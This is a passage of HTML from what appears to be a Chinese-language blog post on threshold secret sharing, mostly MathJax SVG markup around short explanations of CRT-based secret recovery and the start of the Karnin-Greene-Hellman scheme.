7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(7720.8, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p>
<h2 id="秘密恢复"><a href="#秘密恢复" class="headerlink" title="秘密恢复"></a>秘密恢复</h2><p>选取<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="0.817ex" height="1.441ex" role="img" focusable="false" viewBox="0 -626 361 637"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g></g></svg></mjx-container>个成员<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="15.183ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6711 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(500, 0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(642, -150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1545.6, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1990.2, 0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(642, -150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(3035.8, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(3480.4, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(4819.1, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5263.8, 0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(642, -150) scale(0.707)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g><g data-mml-node="mo" transform="translate(6211, 0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container>参与秘密的恢复，通过交换秘密份额，任意成员<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.118ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 936 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(642, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>可以建立同余方程组：</p>
<script type="math/tex; mode=display">
\begin{cases}
Z_1=Z\bmod d_1 \\\\
Z_2=Z\bmod d_2 \\\\
\vdots \\\\
Z_t=Z\bmod d_t
\end{cases}</script><p>由<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="5.029ex" height="1.645ex" role="img" focusable="false" viewBox="0 -705 2223 727"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mi" transform="translate(760, 0)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mi" transform="translate(1519, 0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g></g></svg></mjx-container>可知该方程组有唯一解：</p>
<script type="math/tex; mode=display">Z=\sum_{i=1}^t\frac{D}{d_i}\cdot e_i\cdot Z_i\bmod D,i=1,2,..,t</script><p>其中：</p>
<script type="math/tex; mode=display">D=\prod_{i=1}^td_i</script><script type="math/tex; mode=display">\frac{D}{d_i}\cdot e_i \equiv 1\bmod d_i,i=1,2,\cdots,t</script><p>可求出共享秘密<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="12.684ex" height="2.034ex" role="img" focusable="false" viewBox="0 -705 5606.1 899"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="mo" transform="translate(922.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1978.6, 0)"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="mo" transform="translate(2979.3, 0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833, 0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333, 0)"></path></g><g data-mml-node="mi" transform="translate(5146.1, 0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>。</p>
<h1 id="Karnin-Greene-Hellman-法"><a href="#Karnin-Greene-Hellman-法" class="headerlink" title="Karnin-Greene-Hellman 法"></a>Karnin-Greene-Hellman 法</h1><h2 id="产生主次密钥"><a href="#产生主次密钥" class="headerlink" title="产生主次密钥"></a>产生主次密钥</h2><p>(m,n)</p>
<ol>
<li>信任单位产生<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="5.254ex" height="1.692ex" role="img" focusable="false" viewBox="0 -666 2322.4 748"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(822.2, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(1822.4, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>个任意<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.798ex" xmlns="http://www.w3.org/2000/svg" width="6.523ex" height="2.397ex" role="img" focusable="false" viewBox="0 -706.5 2883.3 1059.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(822.2, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mfrac" transform="translate(1822.4, 0)"><g data-mml-node="mi" transform="translate(318.3, 394) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(220, -345) scale(0.707)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><rect width="820.8" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container>维矩阵，矩阵元素为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex" xmlns="http://www.w3.org/2000/svg" width="1.131ex" height="1.557ex" role="img" focusable="false" viewBox="0 -666 500 688"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container>或<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="1.131ex" height="1.507ex" role="img" focusable="false" viewBox="0 -666 500 666"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>，分别为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="16.299ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 7204 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(500, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mn" transform="translate(750, -150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1653.6, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2098.2, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 